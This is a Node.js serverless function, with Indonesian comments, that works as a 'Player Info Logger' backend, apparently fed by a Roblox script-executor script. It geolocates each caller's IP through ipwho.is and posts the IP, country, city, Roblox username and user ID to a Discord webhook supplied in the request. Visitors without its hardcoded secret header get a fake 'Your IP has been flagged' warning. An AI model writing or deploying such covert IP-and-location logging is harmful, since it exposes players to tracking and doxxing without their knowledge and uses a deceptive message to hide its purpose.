const https = require('https');

module.exports = async (req, res) => {
    const authKey = req.headers['ndraawz-auth'];
    
    // FAKE RESPONSE UNTUK ORANG ISENG / BROWSER
    if (authKey !== "NDRAAWZ_LOGGER_SECRET_666") {
        return res.status(200).send("SECURITY ERROR: Your IP has been flagged for unauthorized access."); 
    }

    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const d = req.query;

    // Fetch Geo-IP Internal
    https.get(`https://ipwho.is/${ip}`, (ipRes) => {
        let body = '';
        ipRes.on('data', chunk => body += chunk);
        ipRes.on('end', () => {
            const geo = JSON.parse(body);
            const flag = geo.country_code ? geo.country_code.toUpperCase().replace(/./g, c => String.fromCodePoint(c.charCodeAt(0) + 127397)) : "🏴‍☠️";

            const embed = {
                title: "📢 Player Info Logger (GOD MODE)",
                color: 16753920,
                fields: [
                    { name: "👤 Username", value: d.u || "Unknown", inline: true },
                    { name: "🆔 User ID", value: d.uid || "Unknown", inline: true },
                    { name: "💻 Executor", value: d.exec || "Unknown", inline: true },
                    { name: "🌐 IP Address", value: `||${geo.ip || ip}||`, inline: true },
                    { name: "🏳️ Country", value: `${flag} ${geo.country || "Unknown"}`, inline: true },
                    { name: "🏙️ City", value: `${geo.city || "-"}`, inline: true },
                    { name: "🗺️ Map", value: `[${d.pname || "Game"}](https://www.roblox.com/games/${d.pid})`, inline: false },
                    { name: "👥 Players", value: `${d.pcount || "0"} / ${d.pmax || "0"}`, inline: true }
                ],
                thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${d.uid}&width=420&height=420&format=png` },
                timestamp: new Date().toISOString()
            };

            // Kirim ke Webhook dinamis yang dikirim dari main.js
            const url = new URL(decodeURIComponent(d.w)); 
            const webhookReq = https.request({
                hostname: url.hostname, path: url.pathname, method: 'POST',
                headers: { 'Content-Type': 'application/json' }
            });
            webhookReq.write(JSON.stringify({ embeds: [embed] }));
            webhookReq.end();
            res.status(200).json({ status: "success" });
        });
    });
};
